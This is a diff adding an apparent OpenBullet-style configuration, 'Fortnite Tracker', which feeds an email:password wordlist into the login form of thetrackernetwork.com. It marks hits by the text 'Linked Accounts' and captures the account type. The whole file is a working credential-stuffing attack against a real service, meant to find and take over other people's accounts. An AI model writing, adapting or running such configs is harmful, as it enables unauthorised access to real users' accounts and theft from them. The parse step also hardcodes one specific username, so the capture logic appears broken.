@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "Fortnite Tracker",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-12T16:25:14.3941218+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.1.6",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://thetrackernetwork.com/auth/login?domain=fortnitetracker.com&returnUrl=%2F" 
+  CONTENT "__RequestVerificationToken=T2ydfMey0nWzeK-CNpoWQDPQx8rDJNa2YiRTY4DQ2ZORdljWfRqQHlyF86Mw9E6l7HFwfDj1GJQCNYuYanA-UMyEDxdkSJZWYUZ6pS7ioANjIelkTA3Jnxct6RfMjOAndYKssmsjNMD7DdK1ynoMAyppDLjwUoAm_g9GO2VI3HI1&UserName=<USER>&Password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://thetrackernetwork.com" 
+  HEADER "referer: https://thetrackernetwork.com/auth/login?domain=fortnitetracker.com&returnUrl=/" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "authority: thetrackernetwork.com" 
+  HEADER "method: POST" 
+  HEADER "path: /auth/login?domain=fortnitetracker.com&returnUrl=%2F" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Linked Accounts" 
+  KEYCHAIN Failure OR 
+    KEY "password are incorrect" 
+
+PARSE "<SOURCE>" LR "<span class=\"name\">cizalopoya</span>" "</span>" -> VAR "TYPE" 
+
+FUNCTION Replace "<span class=\"role\">" " " "<TYPE>" -> CAP "Account Type" 
+
